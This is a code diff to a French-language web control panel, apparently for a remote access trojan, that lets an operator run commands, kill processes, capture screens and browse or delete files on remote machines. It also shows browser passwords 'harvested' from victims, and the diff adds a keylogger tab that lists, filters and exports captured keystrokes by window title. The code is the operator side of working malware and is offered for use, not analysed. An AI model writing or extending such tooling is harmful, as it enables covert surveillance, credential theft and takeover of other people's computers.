@@ -139,14 +139,19 @@
   .alert-ack  { background:transparent; border:1px solid var(--border2); color:var(--muted); font-family:var(--font-mono); font-size:10px; padding:3px 8px; cursor:pointer; }
   .alert-ack:hover { border-color:var(--green); color:var(--green); }
 
+  /* KEYLOGGER */
+  .kl-entry { border-bottom:1px solid var(--border); padding:10px 0; }
+  .kl-window { font-size:10px; color:var(--accent2); text-transform:uppercase; max-width:70%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .kl-pre { font-family:var(--font-mono); font-size:12px; color:var(--green); white-space:pre-wrap; word-break:break-all; background:#050809; padding:8px; border-left:3px solid var(--green); max-height:160px; overflow-y:auto; margin:0; scrollbar-width:thin; scrollbar-color:var(--border2) transparent; }
+
   /* MISC */
   .chart-wrap { height:120px; }
   .empty-state { text-align:center; padding:40px; color:var(--muted); font-size:12px; }
   .empty-state::before { content:'//'; display:block; font-size:24px; margin-bottom:12px; color:var(--border2); }
   .machine-info-bar { display:flex; align-items:center; gap:20px; padding:10px 20px; background:var(--surface); border-bottom:1px solid var(--border); font-size:11px; color:var(--muted); }
   .machine-info-bar strong { color:var(--text); }
-  .tabs { display:flex; border-bottom:1px solid var(--border); background:var(--surface); }
-  .tab { padding:10px 20px; font-size:11px; letter-spacing:1px; text-transform:uppercase; cursor:pointer; border-bottom:2px solid transparent; color:var(--muted); transition:all .15s; }
+  .tabs { display:flex; border-bottom:1px solid var(--border); background:var(--surface); overflow-x:auto; scrollbar-width:none; }
+  .tab { padding:10px 16px; font-size:11px; letter-spacing:1px; text-transform:uppercase; cursor:pointer; border-bottom:2px solid transparent; color:var(--muted); transition:all .15s; white-space:nowrap; flex-shrink:0; }
   .tab.active { color:var(--accent); border-bottom-color:var(--accent); }
   .tab:hover  { color:var(--text); }
   .no-sel { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:var(--muted); gap:16px; }
@@ -202,6 +207,8 @@
 let sb = null, machines = [], selectedMachine = null;
 let cpuChart = null, cpuHistory = Array(30).fill(0), currentTab = 'overview';
 let tmProcs = [], tmSort = {col:'mem_mb', dir:'desc'}, tmFilter = '';
+// ── Keylogger state ──────────────────────────────────────────────
+let klData = [], klFilter = '', klWindowFilter = '';
 
 // ================================================================
 // CLOCK
@@ -285,6 +292,7 @@ function selectMachine(id) {
   currentTab = 'overview';
   cpuHistory = Array(30).fill(0);
   tmProcs = []; tmFilter = '';
+  klData = []; klFilter = ''; klWindowFilter = '';
   if (cpuChart) { cpuChart.destroy(); cpuChart = null; }
   loadMachines();
   renderShell();
@@ -293,8 +301,8 @@ function selectMachine(id) {
 // ================================================================
 // SHELL
 // ================================================================
-const TABS = ['overview','terminal','tasks','screen','files','alerts','credentials'];
-const TLBL = ['VUE D\'ENSEMBLE','TERMINAL','TÂCHES','ÉCRAN','FICHIERS','ALERTES','CREDENTIALS'];
+const TABS = ['overview','terminal','tasks','screen','files','alerts','credentials','keylogger'];
+const TLBL = ['VUE D\'ENSEMBLE','TERMINAL','TÂCHES','ÉCRAN','FICHIERS','ALERTES','CREDENTIALS','KEYLOGGER'];
 
 function renderShell() {
   const m = selectedMachine;
@@ -336,13 +344,14 @@ async function loadTab() {
   if (!selectedMachine) return;
   const el = document.getElementById('tab-content');
   if (!el) return;
-  if (currentTab==='overview') await loadOverview(el);
-  if (currentTab==='terminal') await loadTerminal(el);
-  if (currentTab==='tasks')    await loadTasks(el);
-  if (currentTab==='screen')   await loadScreen(el);
-  if (currentTab==='files')    await loadFiles(el);
-  if (currentTab==='alerts')   await loadAlerts(el);
-  if (currentTab==='credentials') await loadCredentials(el);
+  if (currentTab==='overview')     await loadOverview(el);
+  if (currentTab==='terminal')     await loadTerminal(el);
+  if (currentTab==='tasks')        await loadTasks(el);
+  if (currentTab==='screen')       await loadScreen(el);
+  if (currentTab==='files')        await loadFiles(el);
+  if (currentTab==='alerts')       await loadAlerts(el);
+  if (currentTab==='credentials')  await loadCredentials(el);
+  if (currentTab==='keylogger')    await loadKeylogger(el);
 }
 
 // ================================================================
@@ -387,11 +396,7 @@ async function captureScreen() {
     const { data: res } = await sb.from('file_operations').select('*').eq('id', op.id).single();
     if (!res) continue;
     const result = res.result ? (typeof res.result === 'string' ? JSON.parse(res.result) : res.result) : {};
-
-    if (res.status === 'running') {
-      statusEl.textContent = 'Capture en cours...';
-      continue;
-    }
+    if (res.status === 'running') { statusEl.textContent = 'Capture en cours...'; continue; }
     if (res.status === 'done' && result.link) {
       statusEl.textContent = 'Capture terminée.';
       imgEl.src = result.link;
@@ -572,8 +577,6 @@ async function loadTasks(el) {
         </table>
       </div>
     </div>`;
-
-  // Si on a déjà des données en mémoire, les afficher immédiatement
   if (tmProcs.length > 0) {
     document.getElementById('tm-status').textContent = `${tmProcs.length} processus (cache)`;
     renderTm();
@@ -584,65 +587,34 @@ async function refreshTasks() {
   const btn = document.getElementById('tm-btn');
   const st  = document.getElementById('tm-status');
   if (!btn) return;
-
-  btn.disabled = true;
-  btn.textContent = '...';
+  btn.disabled = true; btn.textContent = '...';
   if (st) st.textContent = 'Envoi de la commande...';
-
   try {
-    // Insérer la commande tasklist
     const { data: cmd, error: insertErr } = await sb
       .from('commands')
       .insert({ machine_id: selectedMachine.id, command: 'tasklist', status: 'pending' })
-      .select('id')
-      .single();
-
-    if (insertErr || !cmd?.id) {
-      if (st) st.textContent = 'Erreur: ' + (insertErr?.message || 'insert failed');
-      return;
-    }
-
-    // Polling jusqu'à 20 secondes
+      .select('id').single();
+    if (insertErr || !cmd?.id) { if (st) st.textContent = 'Erreur: ' + (insertErr?.message || 'insert failed'); return; }
     for (let i = 0; i < 20; i++) {
       await sleep(1000);
       if (st) st.textContent = `En attente... ${i+1}s`;
-
-      const { data: row } = await sb
-        .from('commands')
-        .select('status, output')
-        .eq('id', cmd.id)
-        .single();
-
+      const { data: row } = await sb.from('commands').select('status, output').eq('id', cmd.id).single();
       if (!row) continue;
-
       if (row.status === 'done') {
         if (!row.output) { if (st) st.textContent = 'Réponse vide'; break; }
         try {
-          // Réparer le JSON si tronqué
           let raw = row.output.trim();
-          if (!raw.endsWith(']')) {
-            const last = raw.lastIndexOf('}');
-            raw = last !== -1 ? raw.substring(0, last + 1) + ']' : '[]';
-          }
+          if (!raw.endsWith(']')) { const last = raw.lastIndexOf('}'); raw = last !== -1 ? raw.substring(0, last + 1) + ']' : '[]'; }
           tmProcs = JSON.parse(raw);
           if (st) st.textContent = `${tmProcs.length} processus`;
           renderTm();
-        } catch(e) {
-          if (st) st.textContent = 'Erreur JSON: ' + e.message;
-        }
+        } catch(e) { if (st) st.textContent = 'Erreur JSON: ' + e.message; }
         return;
       }
-
-      if (row.status === 'error') {
-        if (st) st.textContent = 'Erreur agent';
-        return;
-      }
+      if (row.status === 'error') { if (st) st.textContent = 'Erreur agent'; return; }
     }
-
     if (st) st.textContent = 'Timeout — machine hors ligne ?';
-  } finally {
-    if (btn) { btn.disabled = false; btn.textContent = '↺ ACTUALISER'; }
-  }
+  } finally { if (btn) { btn.disabled = false; btn.textContent = '↺ ACTUALISER'; } }
 }
 
 function sortTm(col) {
@@ -655,39 +627,25 @@ function sortTm(col) {
 function renderTm() {
   const body = document.getElementById('tm-body');
   if (!body) return;
-
-  // Headers
   ['pid','name','mem_mb','threads','user'].forEach(c => {
     const th = document.getElementById('th-'+c);
     if (!th) return;
     th.className = tmSort.col===c ? tmSort.dir : '';
   });
-
-  let list = tmProcs.filter(p =>
-    !tmFilter ||
-    (p.name||'').toLowerCase().includes(tmFilter) ||
-    String(p.pid).includes(tmFilter)
-  );
-
+  let list = tmProcs.filter(p => !tmFilter || (p.name||'').toLowerCase().includes(tmFilter) || String(p.pid).includes(tmFilter));
   list.sort((a,b) => {
     const av = a[tmSort.col] ?? '', bv = b[tmSort.col] ?? '';
     if (typeof av === 'number') return tmSort.dir==='asc' ? av-bv : bv-av;
     return tmSort.dir==='asc' ? String(av).localeCompare(String(bv)) : String(bv).localeCompare(String(av));
   });
-
   const st = document.getElementById('tm-status');
   if (st) st.textContent = `${list.length} / ${tmProcs.length} processus`;
-
   const maxMem = Math.max(...list.map(p => p.mem_mb||0), 1);
-
   body.innerHTML = list.map(p => `
     <tr>
       <td class="num">${p.pid}</td>
       <td>${esc(p.name||'')}</td>
-      <td class="num">
-        ${p.mem_mb}
-        <span class="mem-bar" style="width:${Math.max(2, Math.round((p.mem_mb||0)/maxMem*56))}px"></span>
-      </td>
+      <td class="num">${p.mem_mb}<span class="mem-bar" style="width:${Math.max(2, Math.round((p.mem_mb||0)/maxMem*56))}px"></span></td>
       <td class="num">${p.threads||0}</td>
       <td style="font-size:11px;color:var(--muted)">${esc(p.user||'—')}</td>
       <td><button class="kill-btn" onclick="killProc(${p.pid},'${esc(p.name||'')}')">KILL</button></td>
@@ -697,10 +655,8 @@ function renderTm() {
 async function killProc(pid, name) {
   if (!confirm(`Tuer le processus "${name}" (PID ${pid}) ?`)) return;
   await sb.from('commands').insert({ machine_id:selectedMachine.id, command:`kill:${pid}`, status:'pending' });
-  // Retirer immédiatement localement
   tmProcs = tmProcs.filter(p => p.pid !== pid);
   renderTm();
-  // Rafraîchir dans 5s
   setTimeout(refreshTasks, 5000);
 }
 
@@ -750,15 +706,8 @@ function renderFiles(items, cur) {
           <td class="num">${f.is_dir?'—':fmtSize(f.size)}</td>
           <td style="color:var(--muted);font-size:11px">${new Date(f.modified).toLocaleDateString('fr-FR')}</td>
           <td>${!f.is_dir?`
-            <button
-              class="btn-sm"
-              data-path="${esc(cur+'\\'+f.name)}"
-              onclick="event.stopPropagation();downloadFile(this.getAttribute('data-path'))"
-            >Télécharger</button>
-            <button
-              class="btn-sm"
-              onclick="event.stopPropagation();delFile(${JSON.stringify(cur+'\\'+f.name)})"
-            >DEL</button>`:''}</td>
+            <button class="btn-sm" data-path="${esc(cur+'\\'+f.name)}" onclick="event.stopPropagation();downloadFile(this.getAttribute('data-path'))">Télécharger</button>
+            <button class="btn-sm" onclick="event.stopPropagation();delFile(${JSON.stringify(cur+'\\'+f.name)})">DEL</button>`:''}</td>
         </tr>`).join('')}
       </tbody>
     </table>`;
@@ -789,26 +738,14 @@ async function downloadFile(path) {
     const result = res.result ? (typeof res.result === 'string' ? JSON.parse(res.result) : res.result) : {};
     if (res.status === 'running' && result.progress != null) {
       const pct = Math.min(100, result.progress);
-      statusEl.innerHTML = `
-        <span>Upload en cours...</span>
-        <div class="progress-bar-wrap"><div class="progress-bar-fill" style="width:${pct}%"></div></div>
-        <span style="color:var(--muted)">${pct}%</span>`;
+      statusEl.innerHTML = `<span>Upload en cours...</span><div class="progress-bar-wrap"><div class="progress-bar-fill" style="width:${pct}%"></div></div><span style="color:var(--muted)">${pct}%</span>`;
       continue;
     }
     if (res.status === 'done' && result.link) {
-      statusEl.innerHTML = `
-        <span>Lien prêt :</span>
-        <div class="download-link-box">
-          <a href="${esc(result.link)}" target="_blank" rel="noopener">${esc(result.link)}</a>
-          <button class="btn-sm" onclick="navigator.clipboard.writeText('${String(result.link).replace(/\\/g,'\\\\').replace(/'/g,"\\'")}')">Copier</button>
-          <button class="btn-sm" onclick="window.open('${String(result.link).replace(/\\/g,'\\\\').replace(/'/g,"\\'")}')">Ouvrir</button>
-        </div>`;
+      statusEl.innerHTML = `<span>Lien prêt :</span><div class="download-link-box"><a href="${esc(result.link)}" target="_blank" rel="noopener">${esc(result.link)}</a><button class="btn-sm" onclick="navigator.clipboard.writeText('${String(result.link).replace(/\\/g,'\\\\').replace(/'/g,"\\'")}')">Copier</button><button class="btn-sm" onclick="window.open('${String(result.link).replace(/\\/g,'\\\\').replace(/'/g,"\\'")}')">Ouvrir</button></div>`;
       return;
     }
-    if (res.status === 'error') {
-      statusEl.innerHTML = `<span style="color:var(--red)">Erreur : ${esc(result.error || 'inconnue')}</span>`;
-      return;
-    }
+    if (res.status === 'error') { statusEl.innerHTML = `<span style="color:var(--red)">Erreur : ${esc(result.error || 'inconnue')}</span>`; return; }
   }
   statusEl.innerHTML = '<span style="color:var(--yellow)">Timeout (vérifiez que l\'agent est en ligne).</span>';
 }
@@ -939,58 +876,40 @@ function sortCred(col) {
 function renderCredentials() {
   const body = document.getElementById('cred-body');
   if (!body) return;
-
-  // Update sort indicators
   ['source','url','username','password','harvested_at'].forEach(c => {
     const th = document.getElementById('cth-'+c);
     if (th) th.className = credSort.col===c ? credSort.dir : '';
   });
-
   let list = credData.filter(r =>
     !credFilter ||
     (r.url||'').toLowerCase().includes(credFilter) ||
     (r.username||'').toLowerCase().includes(credFilter) ||
     (r.source||'').toLowerCase().includes(credFilter)
   );
-
   list.sort((a, b) => {
     const av = a[credSort.col] ?? '', bv = b[credSort.col] ?? '';
     if (credSort.dir === 'asc') return String(av).localeCompare(String(bv));
     return String(bv).localeCompare(String(av));
   });
-
   const cnt = document.getElementById('cred-count');
   if (cnt) cnt.textContent = `${list.length} / ${credData.length} entrée(s)`;
-
   if (!list.length) {
     body.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:30px;color:var(--muted)">Aucun credential collecté pour cette machine.</td></tr>';
     return;
   }
-
   body.innerHTML = list.map(r => `
     <tr>
       <td><span style="color:var(--accent2);font-size:10px;text-transform:uppercase">${esc(r.source||'chrome')}</span></td>
       <td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(r.url)}">${esc(r.url)}</td>
       <td>${esc(r.username)}</td>
-      <td>
-        <span class="pwd-cell" data-show="0" style="cursor:pointer;user-select:all;letter-spacing:2px;color:var(--muted)" onclick="togglePwd(this,'${esc(r.password)}')">••••••••</span>
-      </td>
+      <td><span class="pwd-cell" data-show="0" style="cursor:pointer;user-select:all;letter-spacing:2px;color:var(--muted)" onclick="togglePwd(this,'${esc(r.password)}')">••••••••</span></td>
       <td style="color:var(--muted);font-size:10px;white-space:nowrap">${ago(r.harvested_at)}</td>
     </tr>`).join('');
 }
 
 function togglePwd(el, pwd) {
-  if (el.dataset.show === '0') {
-    el.textContent = pwd;
-    el.style.letterSpacing = '';
-    el.style.color = 'var(--green)';
-    el.dataset.show = '1';
-  } else {
-    el.textContent = '••••••••';
-    el.style.letterSpacing = '2px';
-    el.style.color = 'var(--muted)';
-    el.dataset.show = '0';
-  }
+  if (el.dataset.show === '0') { el.textContent = pwd; el.style.letterSpacing = ''; el.style.color = 'var(--green)'; el.dataset.show = '1'; }
+  else { el.textContent = '••••••••'; el.style.letterSpacing = '2px'; el.style.color = 'var(--muted)'; el.dataset.show = '0'; }
 }
 
 function exportCredentialsCsv() {
@@ -1012,6 +931,115 @@ async function clearCredentials() {
   if (!confirm(`Supprimer tous les credentials de ${selectedMachine.name} ?`)) return;
   await sb.from('credentials').delete().eq('machine_id', selectedMachine.id);
   await refreshCredentials();
+}
+
+// ================================================================
+// KEYLOGGER
+// ================================================================
+async function loadKeylogger(el) {
+  el.innerHTML = `
+    <div class="content-section">
+      <div class="section-header">
+        <span class="section-title">⌨ KEYLOGGER</span>
+        <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
+          <span id="kl-count" style="font-size:11px;color:var(--muted)">—</span>
+          <button class="btn-sm" onclick="refreshKeylogger()">↺ ACTUALISER</button>
+          <button class="btn-sm" onclick="exportKeyloggerCsv()" style="border-color:var(--accent2);color:var(--accent2)">⬇ CSV</button>
+          <button class="btn-sm" onclick="clearKeylogger()" style="border-color:var(--red);color:var(--red)">🗑 PURGER</button>
+        </div>
+      </div>
+      <div class="tm-toolbar" style="flex-wrap:wrap;gap:8px">
+        <input class="tm-search" id="kl-search" placeholder="Filtrer par fenêtre ou contenu..."
+               oninput="klFilter=this.value.toLowerCase();renderKeylogger()">
+        <select id="kl-window-filter" onchange="klWindowFilter=this.value;renderKeylogger()"
+          style="background:var(--surface2);border:1px solid var(--border2);color:var(--text);
+                 font-family:var(--font-mono);font-size:12px;padding:7px 10px;min-width:200px;outline:none;">
+          <option value="">Toutes les fenêtres</option>
+        </select>
+      </div>
+      <div id="kl-content">
+        <div class="empty-state">Chargement...</div>
+      </div>
+    </div>`;
+  await refreshKeylogger();
+}
+
+async function refreshKeylogger() {
+  const { data } = await sb.from('keystrokes').select('*')
+    .eq('machine_id', selectedMachine.id)
+    .order('captured_at', { ascending: false })
+    .limit(500);
+  klData = data || [];
+
+  // Remplir le select des fenêtres
+  const sel = document.getElementById('kl-window-filter');
+  if (sel) {
+    const windows = [...new Set(klData.map(r => r.window_title).filter(Boolean))];
+    const currentVal = sel.value;
+    sel.innerHTML = '<option value="">Toutes les fenêtres</option>' +
+      windows.map(w => `<option value="${esc(w)}">${esc(w.length > 55 ? w.slice(0,55)+'...' : w)}</option>`).join('');
+    if (currentVal) sel.value = currentVal;
+  }
+
+  const cnt = document.getElementById('kl-count');
+  if (cnt) cnt.textContent = klData.length + ' entrée(s)';
+  renderKeylogger();
+}
+
+function renderKeylogger() {
+  const el = document.getElementById('kl-content');
+  if (!el) return;
+
+  let list = klData.filter(r => {
+    const matchFilter = !klFilter ||
+      (r.content||'').toLowerCase().includes(klFilter) ||
+      (r.window_title||'').toLowerCase().includes(klFilter);
+    const matchWindow = !klWindowFilter || r.window_title === klWindowFilter;
+    return matchFilter && matchWindow;
+  });
+
+  const cnt = document.getElementById('kl-count');
+  if (cnt) cnt.textContent = list.length + ' / ' + klData.length + ' entrée(s)';
+
+  if (!list.length) {
+    el.innerHTML = '<div class="empty-state">Aucune frappe capturée pour cette machine.</div>';
+    return;
+  }
+
+  el.innerHTML = list.map(r => `
+    <div class="kl-entry">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">
+        <span class="kl-window" title="${esc(r.window_title)}">
+          📋 ${esc(r.window_title || '—')}
+        </span>
+        <span style="font-size:10px;color:var(--muted);white-space:nowrap;margin-left:12px">${ago(r.captured_at)}</span>
+      </div>
+      <pre class="kl-pre">${esc(r.content)}</pre>
+    </div>`).join('');
+}
+
+function exportKeyloggerCsv() {
+  if (!klData.length) return;
+  const header = 'Fenetre,Contenu,Capture\n';
+  const rows = klData.map(r =>
+    [r.window_title, r.content, r.captured_at]
+      .map(v => '"' + String(v||'').replace(/"/g,'""') + '"')
+      .join(',')
+  ).join('\n');
+  const blob = new Blob(['\uFEFF' + header + rows], { type: 'text/csv;charset=utf-8;' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'keylogger_' + (selectedMachine.hostname||'machine') + '_' + Date.now() + '.csv';
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+async function clearKeylogger() {
+  if (!confirm('Supprimer toutes les frappes de ' + selectedMachine.name + ' ?')) return;
+  await sb.from('keystrokes').delete().eq('machine_id', selectedMachine.id);
+  klData = []; klFilter = ''; klWindowFilter = '';
+  await refreshKeylogger();
 }
 
 // ================================================================
